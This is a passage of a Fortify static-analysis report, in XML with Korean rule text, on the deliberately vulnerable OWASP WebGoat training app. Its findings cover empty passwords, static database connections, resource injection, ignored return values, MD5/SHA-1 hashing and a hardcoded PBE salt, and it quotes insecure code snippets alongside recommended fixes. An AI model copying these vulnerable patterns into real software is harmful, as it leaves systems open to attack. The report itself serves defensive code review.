2. null 암호, 빈 암호 또는 Hardcoded Password를 식별할 때 기본 규칙은 password 단어를 포함하는 필드와 변수만 고려합니다. 그러나 Fortify Custom Rules Editor는 사용자가 이름을 지정한 필드 및 변수의 암호 관리 이슈 감지에 필요한 규칙을 쉽게 만들 수 있는 Password Management 마법사를 제공합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7186EC2F1AF7900BCF7C2A0803FB4AA9" ruleID="65d3af30-a769-11de-8a39-0800200c9a66">
                            <Category>Password Management: Empty Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>빈 암호는 쉽게 해결할 수 없는 방식으로 시스템 보안을 침해할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>87</LineStart>
<Snippet>	{
	    String username = "";
	    String password = "";
	    username = s.getParser().getRawParameter(USERNAME);
	    password = s.getParser().getRawParameter(PASSWORD);</Snippet>
<TargetFunction>VariableAccess: password</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7E4ECFA4ACF6C490AC08433D2C2A861A" ruleID="65d3af30-a769-11de-8a39-0800200c9a66">
                            <Category>Password Management: Empty Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>빈 암호는 쉽게 해결할 수 없는 방식으로 시스템 보안을 침해할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>68</LineStart>
<Snippet>	{
	    String username = "";
	    String password = "";

	    try</Snippet>
<TargetFunction>VariableAccess: password</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Race Condition: Static Database Connection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>SoapRequest 클래스는 정적 필드에 데이터베이스 연결을 저장하는데 스레드 간에 연결이 공유될 때 race condition이 만들어집니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>데이터베이스 연결과 같은 트랜잭션 리소스 개체는 동시에 트랜잭션 하나에만 연결될 수 있습니다. 따라서 스레드 간에 연결을 공유하지 말고 정적 필드에 저장하지 않아야 합니다. 자세한 내용은 J2EE Specification의 섹션 4.2.3을 참조하십시오.

예제 1:


public class ConnectionManager {

private static Connection conn = initDbConn();
...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>정적 필드에 데이터베이스 연결을 저장하는 대신 연결 풀을 사용하여 연결 개체를 캐시합니다. 대부분의 최신 J2EE 및 Servlet 컨테이너는 기본 제공 풀링 기능을 제공합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. J2EE가 아닌 Java 응용 프로그램을 감사하는 경우 이 범주가 사용자 환경에 적용되지 않을 수 있습니다. 이런 경우 Audit Guide를 사용하여 이러한 문제를 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="DCFF36250D3F64C32E667FEFA44D89EB" ruleID="898621C4-B672-43E6-AAB5-317A3D12D274">
                            <Category>Race Condition: Static Database Connection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>SoapRequest 클래스는 정적 필드에 데이터베이스 연결을 저장하는데 스레드 간에 연결이 공유될 때 race condition이 만들어집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>74</LineStart>
<Snippet>
    //static boolean completed;
    public static Connection connection = null;

    public final static String firstName = "getFirstName";</Snippet>
<TargetFunction>Field: connection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F442CD3145F2B123E11DAE0F8EC32D15" ruleID="898621C4-B672-43E6-AAB5-317A3D12D274">
                            <Category>Race Condition: Static Database Connection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>WSDLScanning 클래스는 정적 필드에 데이터베이스 연결을 저장하는데 스레드 간에 연결이 공유될 때 race condition이 만들어집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>82</LineStart>
<Snippet>    static boolean beenRestartedYet = false;

    public static Connection connection = null;

    public final static String firstName = "getFirstName";</Snippet>
<TargetFunction>Field: connection()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Resource Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>공격자는 Interceptor.java의 93 줄에 있는 Socket()의 리소스 ID 인수를 제어할 수 있습니다. 그렇지 않을 때 보호할 수 있는 시스템 리소스를 공격자가 접근하거나 수정할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Resource injection 이슈는 다음 두 가지 조건을 만족할 때 발생합니다.

1. 공격자가 시스템 리소스에 접근할 때 사용하는 ID를 지정할 수 있습니다.

예를 들어 공격자는 네트워크 리소스에 연결할 때 사용할 포트 번호를 지정할 수 있습니다.

2. 공격자가 리소스를 지정하여 다른 방법으로는 허용되지 않는 권한을 얻습니다.

예를 들어, 프로그램은 공격자에게 민감한 정보를 제 3의 서버에 전달하는 능력을 부여합니다.



참고: 사용자가 파일 시스템에 저장된 리소스의 위치를 조작할 수 있는 Resource Injection은 경로 조작이라는 별도의 범주로 보고됩니다. 이 취약점에 대한 자세한 내용은 Path Manipulation 설명을 참조하십시오.

예제 1: 다음 코드는 HTTP 요청에서 읽은 포트 번호를 사용하여 소켓을 생성합니다.


String remotePort = request.getParameter("remotePort");
...
ServerSocket srvr = new ServerSocket(remotePort);
Socket skt = srvr.accept();
...


모바일 환경에서는 Resource Injection과 같은 전형적인 웹 응용 프로그램 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 2: 다음 코드는 Android 인텐트에서 읽은 URL을 사용하여 WebView에서 페이지를 로드합니다.


...
	WebView webview = new WebView(this);
	setContentView(webview);
        String url = this.getIntent().getExtras().getString("url");
	webview.loadUrl(url);
...


사용자 입력이 적용되는 리소스는 콘텐트가 위험할 수 있음을 나타냅니다. 예를 들어, 마침표, 슬래시 및 백슬래시 등의 특수 문자가 포함된 데이터는 file system과 상호 작용하는 메서드에 사용하면 위험합니다. 마찬가지로 URL 및 URI가 포함된 데이터도 원격 연결을 설정하는 함수에 사용하면 위험합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Resource injection 공격을 예방하는 최선의 방법은 다음 간접 참조를 사용하는 것입니다. 즉, 사용자가 지정할 수 있는 올바른 리소스 이름 목록을 만들어 사용자가 목록에서 선택하는 것만 허용하는 것입니다. 이 접근 방식을 사용하면 사용자가 제공하는 입력은 리소스 이름을 지정하는 데 직접 사용되지 않습니다. 

경우에 따라 올바른 리소스 이름 집합이 너무 크거나 유지 관리가 어렵기 때문에 이 접근 방식은 실용적이지 못합니다. 이때 프로그래머는 주로 거부 목록을 구현합니다. 거부 목록은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리하는 데 사용됩니다. 하지만 안전하지 않은 문자의 목록은 불완전할 가능성이 크고 대부분 최신 상태를 유지하지 못합니다. 효율적인 접근 방식은 리소스 이름에 사용할 수 있는 문자의 목록을 만들어 목록에 있는 문자만으로 이루어진 입력만 받는 것입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 프로그램에서 수행한 사용자 지정 입력값 검증에 만족하는 경우 Fortify Custom Rules Editor를 사용하여 검증 루틴에 대한 정리 규칙을 작성합니다.

2. 효과적인 거부 목록을 구현하는 작업은 매우 어렵습니다. 검증 논리에 거부 목록을 구현해야 할 때는 신중해야 합니다. 다른 운영 체제, 데이터베이스 또는 기타 리소스에서 해석될 때 특수한 의미를 가질 수 있는 다른 메타 문자 집합 및 다른 유형의 입력 인코딩을 고려해 보십시오. 이 요구 사항이 끊임없이 변한다면 과연 거부 목록을 쉽고 정확하고 완전하게 업데이트할 수 있을 것인지 판단해야 합니다.

3. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C41ED2B38B12CC87733F9860635B3D57" ruleID="CF4A0383-901C-4DF6-8AE7-D2E9927D5083">
                            <Category>Resource Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 Interceptor.java의 93 줄에 있는 Socket()의 리소스 ID 인수를 제어할 수 있습니다. 그렇지 않을 때 보호할 수 있는 시스템 리소스를 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		    &amp;&amp; osgServerPort != null &amp;&amp; osgServerPort.length() != 0)
	    {
		osgSocket = new Socket(osgServerName, Integer
			.parseInt(osgServerPort));
		if (osgSocket != null)</Snippet>
<TargetFunction>java.net.Socket.Socket()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>83</LineStart>
<Snippet>	BufferedReader in = null;
	String osgServerName = req.getSession().getServletContext()
		.getInitParameter(OSG_SERVER_NAME);
	String osgServerPort = req.getSession().getServletContext()
		.getInitParameter(OSG_SERVER_PORT);</Snippet>
<TargetFunction>javax.servlet.ServletContext.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1EC821B90272EDDCE494AE29582A4CF2" ruleID="CF4A0383-901C-4DF6-8AE7-D2E9927D5083">
                            <Category>Resource Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 Interceptor.java의 94 줄에 있는 Socket()의 리소스 ID 인수를 제어할 수 있습니다. 그렇지 않을 때 보호할 수 있는 시스템 리소스를 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	    {
		osgSocket = new Socket(osgServerName, Integer
			.parseInt(osgServerPort));
		if (osgSocket != null)
		{</Snippet>
<TargetFunction>java.net.Socket.Socket()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>85</LineStart>
<Snippet>		.getInitParameter(OSG_SERVER_NAME);
	String osgServerPort = req.getSession().getServletContext()
		.getInitParameter(OSG_SERVER_PORT);

	try</Snippet>
<TargetFunction>javax.servlet.ServletContext.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Unchecked Return Value</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>CommandInjection.java의 parseResults() 메서드는 220 줄의 replaceAll()에 의해 반환된 값을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Java 프로그래머가 수많은 java.io 클래스의 일부인 read() 및 관련 메서드를 잘못 해석하는 것은 드문 일이 아닙니다. Java의 대부분의 오류와 비정상적인 이벤트는 예외 발생으로 이어집니다. (이는 Java가 C 등의 언어보다 나은 장점 중 하나입니다. 예외로 인해 프로그래머는 무엇이 잘못되었는지 쉽게 판단할 수 있습니다.) 하지만 stream 및 reader 클래스는 소량의 데이터만 사용할 때는 이를 비정상이나 예외로 간주하지 않습니다. 이 클래스는 단순히 소량의 데이터를 반환 버퍼에 추가하고 반환 값을 읽어들인 바이트 수 또는 문자 수로 설정합니다. 반환되는 데이터 양이 요청한 데이터 양과 같다고 보장할 수 있습니다.

이 동작으로 인해 프로그래머가 read() 및 다른 IO 메서드의 반환 값을 검사하여 데이터를 예상한 양만큼 받도록 하는 것이 중요해집니다.



예제: 다음 코드는 사용자 집합을 차례로 돌면서 각 사용자의 개인 데이터 파일을 읽습니다. 프로그래머는 파일 크기가 항상 정확히 1KB 라고 가정하므로 read()의 반환 값을 무시합니다. 공격자가 작은 파일을 만들면 프로그램은 이전 사용자의 나머지 데이터를 재활용하여 이 데이터가 공격자의 소유인 것처럼 처리합니다.


FileInputStream fis;
byte[] byteArray = new byte[1024];
for (Iterator i=users.iterator(); i.hasNext();) {
    String userName = (String) i.next();
    String pFileName = PFILE_ROOT + "/" + userName;
    FileInputStream fis = new FileInputStream(pFileName);
    fis.read(byteArray); // the file is always 1k bytes
    fis.close();
    processPFile(userName, byteArray);
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>
  FileInputStream fis;
  byte[] byteArray = new byte[1024];
  for (Iterator i=users.iterator(); i.hasNext();) {
    String userName = (String) i.next();
    String pFileName = PFILE_ROOT + "/" + userName;
    fis = new FileInputStream(pFileName);
    int bRead = 0;
    while (bRead &lt; 1024) {
        int rd = fis.read(byteArray, bRead, 1024 - bRead);
        if (rd == -1) {
          throw new IOException("file is unusually small");
        }
        bRead += rd;
    }
    // could add check to see if file is too large here
    fis.close();
    processPFile(userName, byteArray);
  }


참조: 이 문제를 해결하는 방법은 비교적 복잡하기 때문에 읽기 전에 파일 크기를 확인하는 등의 보다 간단한 방법을 사용하고자 할 수 있습니다. 그러나 이러한 방법을 사용하면 응용 프로그램이 file system race condition에 취약해져서 공격자가 파일 크기를 확인하고 파일에서 데이터를 읽기 위해 호출하는 사이에 올바른 형식의 파일을 악성 파일로 대체할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. "그런 일은 절대 일어날 수 없습니다. 왜냐하면..."이라고 말하면서 이 이슈를 덮어두려는 프로그래머를 조심하십시오. 이들은 개발 워크스테이션을 사용하여 시스템 동작 방식에 대한 직관력을 키웠을 가능성이 큽니다. 소프트웨어를 다른 운영 체제, 다른 운영 체제 버전, 다른 하드웨어 구성 또는 다른 런타임 환경에서 실행하게 되면 이들의 직관력은 무용지물이 될 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="30AE8696BEA3CD405C5B06406DC2D875" ruleID="E7C6CAEA-E096-4FCB-81F5-6131E2DE9A45">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>CommandInjection.java의 parseResults() 메서드는 220 줄의 replaceAll()에 의해 반환된 값을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>220</LineStart>
<Snippet>    private String parseResults(String results)
    {
    	results.replaceAll("(?s).*Output...\\s", "").replaceAll("(?s)Returncode.*", "");
    	StringTokenizer st = new StringTokenizer(results, "\n");
    	StringBuffer modified = new StringBuffer();</Snippet>
<TargetFunction>replaceAll()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="064C4C93451D67B8E1CE35240CA83095" ruleID="E7C6CAEA-E096-4FCB-81F5-6131E2DE9A45">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>SoapRequest.java의 getHints() 메서드는 140 줄의 replaceAll()에 의해 반환된 값을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>140</LineStart>
<Snippet>		+ "&amp;lt;/SOAP-ENV:Envelope&amp;gt; &lt;br&gt;&lt;br&gt;"
		+ "Intercept the HTTP request and try to create a SOAP request.";
	soapEnv.replaceAll("(?s) ", "&amp;nbsp;");
	hints.add(soapEnv);
</Snippet>
<TargetFunction>replaceAll()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Weak Cryptographic Hash</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>약한 암호화 해시는 데이터의 무결성을 보장할 수 없고 보안이 중요한 컨텍스트에 사용되어서는 안 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>MD2, MD4, MD5, RIPEMD-160 및 SHA-1은 메시지 및 기타 데이터의 무결성을 확인하는 데 흔히 사용되는 인기 있는 암호화 해시 알고리즘입니다. 하지만 최근의 암호화 연구를 통해 이러한 알고리즘에 근본적인 취약점이 있음이 밝혀졌으므로 더 이상 보안이 중요한 상황에 사용해서는 안 됩니다.

MD 및 RIPEMD 해시를 효과적으로 해체하기 위한 기법이 널리 사용되고 있으므로 보안을 위해 이러한 알고리즘을 신뢰해서는 안 됩니다. SHA-1의 경우, 현재의 기술은 여전히 상당한 계산 능력이 필요하며 구현하기 더 어렵습니다. 그러나 공격자는 알고리즘의 아킬레스 건을 찾아 이를 해결하는 기술로 심지어 더 빠른 공격을 발견할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>보안이 중요한 상황에서는 데이터 확인을 위해 MD2, MD4, MD5, RIPEMD-160 및 SHA-1을 사용하지 마십시오. 현재로서는 SHA-224, SHA-256, SHA-384, SHA-512 및 SHA-3가 좋은 대안입니다. 그러나 보안 해시 알고리즘의 이러한 변형은 SHA-1만큼 세밀히 검사되지 않았으므로 이러한 알고리즘의 보안에 영향을 줄 수 있는 앞으로의 조사에 신경을 써야 합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8ADDC1EF809F4DABD2D7DF2B3A069F79" ruleID="FD6C18E2-3AD8-4842-84CD-3E3D638BCCE4">
                            <Category>Weak Cryptographic Hash</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>약한 암호화 해시는 데이터의 무결성을 보장할 수 없고 보안이 중요한 컨텍스트에 사용되어서는 안 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>640</LineStart>
<Snippet>		try
		{
			md = MessageDigest.getInstance( "MD5" );
			md.update( b );
		}</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="41CC80D06651D0436F9C81A94FE3D68D" ruleID="FD6C18E2-3AD8-4842-84CD-3E3D638BCCE4">
                            <Category>Weak Cryptographic Hash</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>약한 암호화 해시는 데이터의 무결성을 보장할 수 없고 보안이 중요한 컨텍스트에 사용되어서는 안 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>175</LineStart>
<Snippet>		
		try {
			md = MessageDigest.getInstance("SHA");
			buffer = new Date().toString().getBytes();
			</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Weak Cryptographic Hash: Hardcoded PBE Salt</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>하드코드된 솔트(hardcoded salt)는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>솔트를 하드코드하는 것은 좋은 방법이 아닙니다. 하드코드 솔트(hardcoded salt)는 모든 프로젝트 개발자가 솔트를 볼 수 있을 뿐 아니라 문제 해결을 극히 어렵게 만듭니다. 코드가 운영 단계에 들어간 후에는 솔트를 쉽게 변경할 수 없습니다. 공격자가 솔트 값을 아는 경우 응용 프로그램에 대한 "레인보우 테이블"을 계산하여 해시된 값을 더 쉽게 확인할 수 있습니다.


예제 1: 다음 코드는 하드코드 솔트를 사용합니다.

...
private static final String salt = "2!@$(5#@532@%#$253l5#@$";
...
PBEKeySpec pbeSpec=new PBEKeySpec(password);
SecretKeyFactory keyFact=SecretKeyFactory.getInstance(CIPHER_ALG);
PBEParameterSpec defParams=new PBEParameterSpec(salt,0);
Cipher cipher=Cipher.getInstance(CIPHER_ALG);
cipher.init(cipherMode,keyFact.generateSecret(pbeSpec),defParams);
...


이 코드는 성공적으로 실행되지만 코드에 접근할 수 있는 사용자는 솔트에도 접근할 수 있습니다. 프로그램을 공개한 후에는 솔트 “2!@$(5#@532@%#$253l5#@$”를 변경할 방법이 없습니다. 직원이 이 정보에 대한 접근 권한을 갖게 되면 이를 사용하여 시스템에 침입할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>솔트는 하드코드되어서는 안 되며 보통 난독 처리하여 외부 소스에서 관리해야 합니다. 시스템의 임의의 장소에 솔트를 일반 텍스트로 저장하면 권한이 있는 사용자라면 누구나 솔트를 읽어 남용할 가능성이 있습니다.

예제 2: 다음 코드는 시스템 관리자가 구성한 솔트 변수를 사용합니다.

...
PBEKeySpec pbeSpec=new PBEKeySpec(password);
SecretKeyFactory keyFact=SecretKeyFactory.getInstance(CIPHER_ALG);
PBEParameterSpec defParams=new PBEParameterSpec(salt,0);
Cipher cipher=Cipher.getInstance(CIPHER_ALG);
cipher.init(cipherMode,keyFact.generateSecret(pbeSpec),defParams);
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="92E48BD42982594AB467F3E28F324EA1" ruleID="116373B0-38D5-4932-82BC-3F4BFB082B96">
                            <Category>Weak Cryptographic Hash: Hardcoded PBE Salt</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>하드코드된 솔트(hardcoded salt)는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>531</LineStart>
<Snippet>		{

			PBEParameterSpec ps = new javax.crypto.spec.PBEParameterSpec( salt, 20 );

